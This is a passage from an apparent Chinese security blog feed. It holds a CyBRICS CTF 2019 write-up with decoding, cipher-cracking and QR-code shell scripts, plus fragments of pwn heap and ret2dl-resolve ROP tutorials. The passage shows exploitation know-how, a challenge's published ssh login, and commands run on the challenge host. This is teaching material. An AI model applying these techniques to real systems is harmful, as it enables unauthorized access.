class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + <span class="number">8L</span>L));   <span class="comment">//free第一个参数，书名指针</span></span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L));  <span class="comment">//free第二个参数，描述指针</span></span><br><span class="line">      <span class="built_in">free</span>(*((<span class="keyword">void</span> **)off_202010 + i));                      <span class="comment">//free第三个参数，图书信息指针</span></span><br><span class="line">      *((_QWORD *)off_202010 + i) = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't find selected book!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong id"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="泄露first-book地址"><a href="#泄露first-book地址" class="headerlink" title="泄露first_book地址"></a>泄露first_book地址</h4>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cybrics CTF 2019 writeup</title>
      <link href="/2019/07/25/cybrics/"/>
      <url>/2019/07/25/cybrics/</url>
      
        <content type="html"><![CDATA[<p>前几天打了一下cybrics CTF，主要都是杂项，学到了不少东西，因此记录一下。</p><p><img alt="" data-src="/2019/07/25/cybrics/ctf.png" class="lazyload"></p><h3 id="Oldman-Reverse"><a href="#Oldman-Reverse" class="headerlink" title="Oldman Reverse"></a>Oldman Reverse</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc:I&apos;ve found this file in my grandfather garage. Help me understand what it does</span><br><span class="line">file:oldman.asm</span><br></pre></td></tr></table></figure><p>oldman.asm内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.MCALL  .TTYOUT,.EXIT</span><br><span class="line">START:</span><br><span class="line">    mov   #MSG r1 </span><br><span class="line">    mov #0d r2</span><br><span class="line">    mov #32d r3</span><br><span class="line">loop:       </span><br><span class="line">    mov   #MSG r1 </span><br><span class="line">    add r2 r1</span><br><span class="line">    movb    (r1) r0</span><br><span class="line">    .TTYOUT</span><br><span class="line">    sub #1d r3</span><br><span class="line">    cmp #0 r3</span><br><span class="line">    beq     DONE</span><br><span class="line">    add #33d r2</span><br><span class="line">    swab r2      ;将目标位置的字数据的高位字节与低位字节互换</span><br><span class="line">    clrb r2      ;将目标位置的低字节数据清零</span><br><span class="line">    swab r2      ;将目标位置的字数据的高位字节与低位字节互换</span><br><span class="line">    br      loop      </span><br><span class="line">DONE: </span><br><span class="line">    .EXIT</span><br><span class="line"></span><br><span class="line">MSG:</span><br><span class="line">    .ascii &quot;cp33AI9~p78f8h1UcspOtKMQbxSKdq~^0yANxbnN)d&#125;k&amp;6eUNr66UK7Hsk_uFSb5#9b&amp;PjV5_8phe7C#CLc#&lt;QSr0sb6&#123;%NC8G|ra!YJyaG_~RfV3sw_&amp;SW~&#125;((_1&gt;rh0dMzi&gt;&lt;i6)wPgxiCzJJVd8CsGkT^p&gt;_KXGxv1cIs1q(QwpnONOU9PtP35JJ5&lt;hlsThB&#123;uCs4knEJxGgzpI&amp;u)1d&#123;4&lt;098KpXrLko&#123;Tn&#123;gY&lt;|EjH_ez&#123;z)j)_3t(|13Y&#125;&quot;</span><br><span class="line">.end START</span><br></pre></td></tr></table></figure><p>看懂汇编代码就可以了，字符串长度刚好为256，注释的三行代码相当于模256，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"cp33AI9~p78f8h1UcspOtKMQbxSKdq~^0yANxbnN)d&#125;k&amp;6eUNr66UK7Hsk_uFSb5#9b&amp;PjV5_8phe7C#CLc#&lt;QSr0sb6&#123;%NC8G|ra!YJyaG_~RfV3sw_&amp;SW~&#125;((_1&gt;rh0dMzi&gt;&lt;i6)wPgxiCzJJVd8CsGkT^p&gt;_KXGxv1cIs1q(QwpnONOU9PtP35JJ5&lt;hlsThB&#123;uCs4knEJxGgzpI&amp;u)1d&#123;4&lt;098KpXrLko&#123;Tn&#123;gY&lt;|EjH_ez&#123;z)j)_3t(|13Y&#125;"</span></span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">flag += s[a]</span><br><span class="line">a = (a + <span class="number">33</span>) % <span class="number">256</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag：cybrics{pdp_gpg_crc_dtd_bkb_php}</p><h3 id="Honey-Help"><a href="#Honey-Help" class="headerlink" title="Honey, Help!"></a>Honey, Help!</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc:I was working in my Kali MATE, pressed something, AND EVERYTHING DISAPPEARED!</span><br><span class="line">file:honey_hlep.txt</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/07/25/cybrics/honey_help.png" class="lazyload"></p><p><code>echo $&#39;\e(0)&#39;</code>命令将终端的assic转化成一种加密的字符z，输入<code>abcdefghijklmnopqrstuvwxy{}</code></p><p><img alt="" data-src="/2019/07/25/cybrics/1.JPG" class="lazyload"></p><p>看题目给的图片，容易发现倒数第二行就是加密的flag。当时我是一个个手工替换，后来参考了一下ctftime上的脚本（注意：只能python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8          </span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">'▒␉␌␍␊°±</span></span><br><span class="line"><span class="string">␋┘┐┌└┼⎺⎻─⎼⎽├┤┴┬│≤≥π£'</span></span><br><span class="line">plaintext = <span class="string">'abcdefghijklmnopqrstuvwxyz&#123;&#125;'</span></span><br><span class="line">mapping = &#123;i:j <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(ciphertext, plaintext)&#125;</span><br><span class="line"></span><br><span class="line">print(mapping)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'honey_help.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(<span class="string">''</span>.join([mapping.get(i, i) <span class="keyword">for</span> i <span class="keyword">in</span> f.read()]))</span><br></pre></td></tr></table></figure><p>flag：cybrics{h0ly_cr4p_1s_this_al13ni$h_0r_w4t?}</p><h3 id="Zakukozh"><a href="#Zakukozh" class="headerlink" title="Zakukozh"></a>Zakukozh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc:This image containing flag is encrypted with affine cipher. Scrape it</span><br><span class="line">file:zakukozh.bin</span><br></pre></td></tr></table></figure><p>根据描述，zakukozh.bin是仿射密码加密的密文，仿射密码加密解密规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">加密：c = ((a * x) + b) mod m</span><br><span class="line">解密：x = (a^-1 * (x - b)) mod m</span><br><span class="line">x：明文</span><br><span class="line">c：密文</span><br><span class="line">a，b：密钥</span><br><span class="line">m：密文空间</span><br><span class="line">a^-1：a关于m的乘法逆元</span><br><span class="line">其中：a与m互素</span><br></pre></td></tr></table></figure><p>这里数据以字节为单位，因此m=256，a为3到256的奇数，b为0到255。密文空间为127*256，可以爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affine_d</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line"><span class="keyword">return</span> chr((a*(ord(c) - b))%<span class="number">256</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"zakukozh.bin"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">256</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">file = <span class="string">''</span>.join([affine_d(i,j,c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output/file_&#123;&#125;_&#123;&#125;"</span>.format(i,j),<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(file)</span><br></pre></td></tr></table></figure><p>然后</p><p><img alt="" data-src="/2019/07/25/cybrics/1.png" class="lazyload"></p><p>查看file_239_89，发现flag</p><p>除此之外，还有一种简易的方法</p><p>查看加密文件头<code>60 09 EB 82 1C EF DF EF</code></p><ul><li>JPEG: <code>ff d8 ff e0 xx xx 4a 46 49 46</code></li><li>GIF: <code>47 49 46 38 39 61</code></li><li>PNG: <code>89 50 4e 47 0d 0a 1a 0a</code></li></ul><p>因为仿射密码是简单的代换密码，因此猜测是png加密，于是可以直接根据文件头爆破a，b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">png      = [<span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x4e</span>, <span class="number">0x47</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x1a</span>, <span class="number">0x0a</span>]</span><br><span class="line">zakukozh = [<span class="number">0x60</span>, <span class="number">0x09</span>, <span class="number">0xeb</span>, <span class="number">0x82</span>, <span class="number">0x1c</span>, <span class="number">0xef</span>, <span class="number">0xdf</span>, <span class="number">0xef</span>]</span><br><span class="line">x = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_a_b</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">256</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">x = zakukozh[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">x[i] = (a*(zakukozh[i] - b))%<span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> x==png:</span><br><span class="line"><span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">a,b = brute_a_b()</span><br><span class="line"><span class="keyword">print</span> a,b</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"zakukozh.bin"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">png = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">png += chr((a * (ord(i) - b))%<span class="number">256</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.png"</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(png)</span><br></pre></td></tr></table></figure><p>flag：cybrics{W311_C0M3_2_CY13R1C5}</p><h3 id="ProCTF"><a href="#ProCTF" class="headerlink" title="ProCTF"></a>ProCTF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desc:We Provide you a Login for your scientific researches. Don&apos;t try to find the flag.</span><br><span class="line"></span><br><span class="line">ssh pro@95.179.148.72</span><br><span class="line">Password: iamthepr0</span><br></pre></td></tr></table></figure><p>这里考察prolog语言如何调用shell，参考链接</p><p><a href="http://www.ruanyifeng.com/blog/2019/01/prolog.html（Prolog" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/01/prolog.html（Prolog</a> 语言入门教程）</p><p><a href="https://www.swi-prolog.org/pldoc/doc_for?object=shell%3Ashell/0（Prolog调用shell）" target="_blank" rel="noopener">https://www.swi-prolog.org/pldoc/doc_for?object=shell%3Ashell/0（Prolog调用shell）</a></p><p><img alt="" data-src="/2019/07/25/cybrics/2.png" class="lazyload"></p><p>flag:cybrics{feeling_like_a_PRO?_that_sounds_LOGical_to_me!____g3t_it?_G37_1T?!?!_ok_N3v3Rm1nd…}</p><h3 id="QShell"><a href="#QShell" class="headerlink" title="QShell"></a>QShell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QShell is running on</span><br><span class="line">nc spbctf.ppctf.net 37338</span><br><span class="line"></span><br><span class="line">Grab the flag</span><br></pre></td></tr></table></figure><p>连上之后，发现接收到一张二维码，解码结果为<code>sh-5.0$</code>。猜测应该是把交互信息通过二维码传输。于是只需两个转换脚本即可解决。首先，将接收的数据转为二维码图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">data = p.recvuntil(<span class="string">"\n."</span>).rstrip(<span class="string">'.'</span>).rstrip()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">data += <span class="string">'#'</span></span><br><span class="line">qr = [[]]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; len(data):</span><br><span class="line"><span class="keyword">if</span> data[i] == <span class="string">'\xe2'</span>:   <span class="comment">#白色部分'\xe2\x96\x88'</span></span><br><span class="line">qr[<span class="number">-1</span>].append(<span class="number">255</span>)  <span class="comment">#RGB（255,255,255）为白色</span></span><br><span class="line">i += <span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> data[i] == <span class="string">'\x20'</span>: <span class="comment">#黑色部分为空格</span></span><br><span class="line">qr[<span class="number">-1</span>].append(<span class="number">0</span>)    <span class="comment">#RGB（0,0,0）为黑色</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> data[i] == <span class="string">'\x0a'</span>: <span class="comment">#换行</span></span><br><span class="line">qr.append([])</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">image = Image.new(<span class="string">'RGB'</span>,(len(qr),len(qr[<span class="number">0</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(qr)):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(len(qr[<span class="number">0</span>])):</span><br><span class="line">rgb = qr[y][x]</span><br><span class="line">image.putpixel((x,y),(rgb,rgb,rgb))</span><br><span class="line"></span><br><span class="line">size = len(qr)</span><br><span class="line">image = image.resize((size * <span class="number">3</span>, size * <span class="number">3</span>))  <span class="comment">#3层通道</span></span><br><span class="line">image.save(<span class="string">"qr.png"</span>)</span><br><span class="line"></span><br><span class="line">result = decode(image)</span><br><span class="line"><span class="keyword">print</span>  result[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>将二维码转化为传送数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img = qrcode.make(<span class="string">'cat flag.txt'</span>)   <span class="comment">#生成二维码图片</span></span><br><span class="line">data = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">        r = img.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">255</span>:</span><br><span class="line">            data += <span class="string">b'\xe2\x96\x88'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += <span class="string">b' '</span></span><br><span class="line">    data += <span class="string">b'\n'</span></span><br><span class="line">data += <span class="string">b'\n.'</span></span><br></pre></td></tr></table></figure><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">"spbctf.ppctf.net"</span>, <span class="string">"37338"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">()</span>:</span></span><br><span class="line">data = p.recvuntil(<span class="string">"\n."</span>).rstrip(<span class="string">'.'</span>).rstrip()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">data += <span class="string">'#'</span></span><br><span class="line">qr = [[]]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; len(data):</span><br><span class="line"><span class="keyword">if</span> data[i] == <span class="string">'\xe2'</span>:</span><br><span class="line">qr[<span class="number">-1</span>].append(<span class="number">255</span>)</span><br><span class="line">i += <span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> data[i] == <span class="string">'\x20'</span>:</span><br><span class="line">qr[<span class="number">-1</span>].append(<span class="number">0</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> data[i] == <span class="string">'\x0a'</span>:</span><br><span class="line">qr.append([])</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">'RGB'</span>,(len(qr),len(qr[<span class="number">0</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(qr)):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(len(qr[<span class="number">0</span>])):</span><br><span class="line">rgb = qr[y][x]</span><br><span class="line">image.putpixel((x,y),(rgb,rgb,rgb))</span><br><span class="line"></span><br><span class="line">size = len(qr)</span><br><span class="line">image = image.resize((size * <span class="number">3</span>, size * <span class="number">3</span>))</span><br><span class="line"><span class="comment">#image.save("flag.png")</span></span><br><span class="line"></span><br><span class="line">result = decode(image)</span><br><span class="line"><span class="keyword">print</span>  result[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(cmd)</span>:</span></span><br><span class="line">img = qrcode.make(cmd)</span><br><span class="line">data = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">r = img.getpixel((x, y))</span><br><span class="line"><span class="keyword">if</span> r == <span class="number">255</span>:</span><br><span class="line">data += <span class="string">b'\xe2\x96\x88'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data += <span class="string">' '</span></span><br><span class="line">data += <span class="string">'\n'</span></span><br><span class="line">data += <span class="string">b'\n.'</span></span><br><span class="line">p.sendline(data)</span><br><span class="line"></span><br><span class="line">recv()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">cmd = raw_input(<span class="string">"sh-5.0$ "</span>)</span><br><span class="line">send(cmd)</span><br><span class="line">recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img alt="" data-src="/2019/07/25/cybrics/3.png" class="lazyload"></p><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc:E_TOO_EASY</span><br><span class="line"></span><br><span class="line">Just get the flag</span><br></pre></td></tr></table></figure><p>网页有跳转，查看源网页</p><p><img alt="" data-src="/2019/07/25/cybrics/4.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PWN学习之高级ROP</title>
      <link href="/2019/07/06/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%AB%98%E7%BA%A7ROP/"/>
      <url>/2019/07/06/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%AB%98%E7%BA%A7ROP/</url>
      
        <content type="html"><![CDATA[<h3 id="ret2dl"><a href="#ret2dl" class="headerlink" title="ret2dl"></a>ret2dl</h3><p>前提</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、理解ELF</span><br><span class="line">2、理解延迟绑定技术</span><br><span class="line">3、基本ROP</span><br></pre></td></tr></table></figure><p>这里以<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的bof文件为例</a></p><p>查找何处调用write函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bof|grep write</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/2.JPG" class="lazyload"></p><p>发现程序只在0x804859a处调用了一次write函数，且write函数在plt表中的地址为0x80483d0。</p><p>下面进行gdb调试</p><p>在0x804859a处下断点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x804859a</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/3.JPG" class="lazyload"></p><p>查看plt表中write函数的内容，此时write函数不曾被调用</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/4.JPG" class="lazyload"></p><p>程序跳转到0x804a01c处，查看该地址内容</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/5.JPG" class="lazyload"></p><p>0x804a01c是write函数在plt表中的地址，因为write函数未被调用，所以此时got表中没有存放write函数的真实地址，而是存放write函数在plt表中的下一条地址，执行push 0x20。</p><p>接着程序跳转到0x8048380，这是plt表的入口地址，查看该地址即plt[0]内容</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/6.JPG" class="lazyload"></p><p>程序将0x804a004处的内容入栈，0x0804a004即got[1]，因此该处的内容为link_map。</p><p>程序接着执行0x804a008即got[0]，即调用动态装载器中 _dl_runtime_resolve(link_map,reloc_arg=0x20) 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x8048380:push   DWORD PTR ds:0x804a004 ---&gt;0xf7ffd950 ---&gt; link_map</span><br><span class="line">0x8048386:jmp    DWORD PTR ds:0x804a008 ---&gt;0xf7fe96c0 ---&gt; _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>下面是_dl_runtime_resolve找到write函数的真实地址并写入got表的过程</p><p>首先通过计算JMPREL[0x20]找到<code>.rel.plt</code>中的write函数，因为JMPREL映射到<code>.rel.plt</code>。查看JMPREL地址</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/7.JPG" class="lazyload"></p><p>JMPREL[0x20] = 0x8048350</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/8.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset=0x804a01c #即write的got表地址   </span><br><span class="line">r_info=607 #结尾必须是7</span><br></pre></td></tr></table></figure><p>根据r_info找到<code>.dynsym</code>表中的st_name即计算SYMTAB[(r_info&gt;&gt;8)*0x10]，SYMTAB映射到<code>.dynsym</code>,其中0x10为<code>.dynsym</code>每一项的大小。查看SYMTAB的地址</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/9.JPG" class="lazyload"></p><p>SYMTAB[(r_info&gt;&gt;8)*0x10] = 0x8048238</p><p><img alt="" data-src="/2019/07/06/PWN学习之高级ROP/10.JPG" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_name=0x4c  #动态符号在 .dynstr 表（动态字符串表）中的偏移</span><br><span class="line">st_shndx=0x12</span><br></pre></td></tr></table></figure><p>根据st_name找到<code>.dynstr</code>表中write符号即计算STRTAB[0x4c]，STRTAB映射到<code>.dynstr</code></p><p><img alt="" 